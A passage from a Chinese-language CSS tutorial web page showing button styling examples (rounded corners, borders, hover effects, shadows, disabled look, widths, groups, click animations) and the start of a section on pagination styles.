圆角按钮（border-radius）</h3><p>使用 border-radius 属性来设置圆角按钮。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;&#125;<br><span class="hljs-selector-class">.button2</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<br><span class="hljs-selector-class">.button3</span>&#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;&#125;<br><span class="hljs-selector-class">.button4</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;&#125;<br><span class="hljs-selector-class">.button5</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-4-按钮边框颜色（border）"><a href="#8-4-按钮边框颜色（border）" class="headerlink" title="8.4 按钮边框颜色（border）"></a>8.4 按钮边框颜色（border）</h3><p>使用 border 属性设置按钮边框颜色。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: white;<br>    <span class="hljs-attribute">color</span>: black;<br>   <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#4CAF50</span>; <span class="hljs-comment">/* Green */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-5-鼠标悬停按钮"><a href="#8-5-鼠标悬停按钮" class="headerlink" title="8.5 鼠标悬停按钮"></a>8.5 鼠标悬停按钮</h3><p>使用 :hover 选择器来修改鼠标悬停在按钮上的样式。可以使用 transition-duration 属性来设置 “hover” 效果的速度。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button</span> &#123;<br>    -webkit-<span class="hljs-attribute">transition-duration</span>: <span class="hljs-number">0.4s</span>; <span class="hljs-comment">/* Safari */</span><br>   <span class="hljs-attribute">transition-duration</span>: <span class="hljs-number">0.4s</span>;<br>&#125;<br><br><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>   <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>; <span class="hljs-comment">/* Green */</span><br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-6-按钮阴影（box-shadow）"><a href="#8-6-按钮阴影（box-shadow）" class="headerlink" title="8.6 按钮阴影（box-shadow）"></a>8.6 按钮阴影（box-shadow）</h3><p>阴影按钮鼠标悬停后显示阴影。可以使用 box-shadow 属性来为按钮添加阴影。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">6px</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span><span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.19</span>);<br>&#125;<br><br><span class="hljs-selector-class">.button2</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">12px</span>16px <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.24</span>), <span class="hljs-number">0</span> <span class="hljs-number">17px</span> <span class="hljs-number">50px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.19</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-7-禁用按钮（opacity）"><a href="#8-7-禁用按钮（opacity）" class="headerlink" title="8.7 禁用按钮（opacity）"></a>8.7 禁用按钮（opacity）</h3><p>正常按钮禁用按钮。可以使用 opacity 属性为按钮添加透明度 (看起来类似”disabled” 属性效果)。<br>可以添加 cursor 属性并设置为”not-allowed” 来设置一个禁用的图片。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.disabled</span> &#123;<br>    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;<br>    <span class="hljs-attribute">cursor</span>: not-allowed;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-8-按钮宽度（width）"><a href="#8-8-按钮宽度（width）" class="headerlink" title="8.8 按钮宽度（width）"></a>8.8 按钮宽度（width）</h3><p>默认情况下，按钮的大小有按钮上的文本内容决定( 根据文本内容匹配长度 )。 可以使用 width 属性来设置按钮的宽度。如果要设置固定宽度可以使用像素 (px) 为单位，如果要设置响应式的按钮可以设置为百分比。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">250px</span>;&#125;<br><span class="hljs-selector-class">.button2</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;&#125;<br><span class="hljs-selector-class">.button3</span> &#123;<span class="hljs-attribute">width</span>:<span class="hljs-number">100%</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-9-按钮组"><a href="#8-9-按钮组" class="headerlink" title="8.9 按钮组"></a>8.9 按钮组</h3><p>移除外边距并添加 float:left 来设置按钮组。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-10-带边框按钮组（border）"><a href="#8-10-带边框按钮组（border）" class="headerlink" title="8.10 带边框按钮组（border）"></a>8.10 带边框按钮组（border）</h3><p>使用 border 属性来设置带边框的按钮组。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span>solid green<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-11-按钮动画"><a href="#8-11-按钮动画" class="headerlink" title="8.11 按钮动画"></a>8.11 按钮动画</h3><h4 id="8-11-1-实例1"><a href="#8-11-1-实例1" class="headerlink" title="8.11.1 实例1"></a>8.11.1 实例1</h4><p>使用实例：鼠标移动到按钮上后添加箭头标记</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>.button &#123;<br><span class="css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f4511e</span>;</span><br><span class="css">  <span class="hljs-attribute">border</span>: none;</span><br><span class="css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFFFFF</span>;</span><br><span class="css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="css">  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;</span><br><span class="css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;</span><br><span class="css">  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><br><span class="css">  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.5s</span>;</span><br><span class="css">  <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css">  <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;</span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span> <span class="hljs-selector-tag">span</span> &#123;</span><br><span class="css">  <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="css">  <span class="hljs-attribute">position</span>: relative;</span><br><span class="css">  <span class="hljs-attribute">transition</span>: <span class="hljs-number">0.5s</span>;</span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span> <span class="hljs-selector-tag">span</span>:after &#123;</span><br><span class="css">  <span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;»&#x27;</span>;</span><br><span class="css">  <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css">  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;</span><br><span class="css">  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;</span><br><span class="css">  <span class="hljs-attribute">right</span>: -<span class="hljs-number">20px</span>;</span><br><span class="css">  <span class="hljs-attribute">transition</span>: <span class="hljs-number">0.5s</span>;</span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">span</span> &#123;</span><br><span class="css">  <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">25px</span>;</span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">span</span>:after &#123;</span><br><span class="css">  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;</span><br><span class="css">  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>按钮动画<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;vertical-align:middle&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Hover <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="8-11-2-实例2"><a href="#8-11-2-实例2" class="headerlink" title="8.11.2 实例2"></a>8.11.2 实例2</h4><p>使用实例：点击时添加 “波纹” 效果</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>.button &#123;<br><span class="css">    <span class="hljs-attribute">position</span>: relative;</span><br><span class="css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;</span><br><span class="css">    <span class="hljs-attribute">border</span>: none;</span><br><span class="css">    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;</span><br><span class="css">    <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFFFFF</span>;</span><br><span class="css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;</span><br><span class="css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><br><span class="css">    <span class="hljs-attribute">text-align</span>: center;</span><br><span class="css">    -webkit-<span class="hljs-attribute">transition-duration</span>: <span class="hljs-number">0.4s</span>; <span class="hljs-comment">/* Safari */</span></span><br><span class="css">    <span class="hljs-attribute">transition-duration</span>: <span class="hljs-number">0.4s</span>;</span><br><span class="css">    <span class="hljs-attribute">text-decoration</span>: none;</span><br><span class="css">    <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="css">    <span class="hljs-attribute">cursor</span>: pointer;</span><br>&#125;<br><br>.button:after &#123;<br><span class="css">    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="css">    <span class="hljs-attribute">background</span>: <span class="hljs-number">#90EE90</span>;</span><br><span class="css">    <span class="hljs-attribute">display</span>: block;</span><br><span class="css">    <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css">    <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">300%</span>;</span><br><span class="css">    <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">350%</span>;</span><br><span class="css">    <span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">20px</span><span class="hljs-meta">!important</span>;</span><br><span class="css">    <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">120%</span>;</span><br><span class="css">    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;</span><br><span class="css">    <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.8s</span></span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:active</span>:after &#123;</span><br><span class="css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="css">    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="css">    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;</span><br><span class="css">    <span class="hljs-attribute">transition</span>: <span class="hljs-number">0s</span></span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>按钮动画 - 波纹效果<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="8-11-3-实例3"><a href="#8-11-3-实例3" class="headerlink" title="8.11.3 实例3"></a>8.11.3 实例3</h4><p>使用实例：点击时添加 “压下” 效果</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>.button &#123;<br><span class="css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">25px</span>;</span><br><span class="css">  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">24px</span>;</span><br><span class="css">  <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css">  <span class="hljs-attribute">text-align</span>: center;   </span><br><span class="css">  <span class="hljs-attribute">text-decoration</span>: none;</span><br><span class="css">  <span class="hljs-attribute">outline</span>: none;</span><br><span class="css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;</span><br><span class="css">  <span class="hljs-attribute">border</span>: none;</span><br><span class="css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">15px</span>;</span><br><span class="css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">9px</span> <span class="hljs-number">#999</span>;</span><br>&#125;<br><br><span class="css"><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#3e8e41</span>&#125;</span><br><br><span class="css"><span class="hljs-selector-class">.button</span><span class="hljs-selector-pseudo">:active</span> &#123;</span><br><span class="css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#3e8e41</span>;</span><br><span class="css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span> <span class="hljs-number">#666</span>;</span><br><span class="css">  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">4px</span>);</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>按钮动画 - &quot;按压效果&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="9-分页实例"><a href="#9-分页实例" class="headerlink" title="9.分页实例"></a>9.分页实例</h2><p>使用 CSS 来创建分页的实例。</p><h3 id="9-1-简单分页"><a href="#9-1-简单分页" class="headerlink" title="9.1 简单分页"></a>9.1 简单分页</h3><p>如果网站有很多个页面，就需要使用分页来为每个页面做导航。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> &#123;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">display</span>: inline;&#125;<br><br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">16px</span>;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-2-点击及鼠标悬停分页样式"><a href="#9-2-点击及鼠标悬停分页样式" class="headerlink" title="9.2 点击及鼠标悬停分页样式"></a>9.2 点击及鼠标悬停分页样式</h3><p>如果点击当前页，可以使用 .active 来设置当期页样式，鼠标悬停可以使用 :hover 选择器来修改样式。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">:not</span>(<span class="hljs-selector-class">.active</span>) &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ddd</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-3-圆角样式"><a href="#9-3-圆角样式" class="headerlink" title="9.3 圆角样式"></a>9.3 圆角样式</h3><p>使用 border-radius 属性为选中的页码来添加圆角样式。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-4-鼠标悬停过渡效果"><a href="#9-4-鼠标悬停过渡效果" class="headerlink" title="9.4 鼠标悬停过渡效果"></a>9.4 鼠标悬停过渡效果</h3><p>通过添加 transition 属性来为鼠标移动到页码上时添加过渡效果。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">transition</span>: background-color .<span class="hljs-number">3s</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-5-带边框分页"><a href="#9-5-带边框分页" class="headerlink" title="9.5 带边框分页"></a>9.5 带边框分页</h3><p>使用 border 属性来添加带边框分页。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.pagination</span> <span 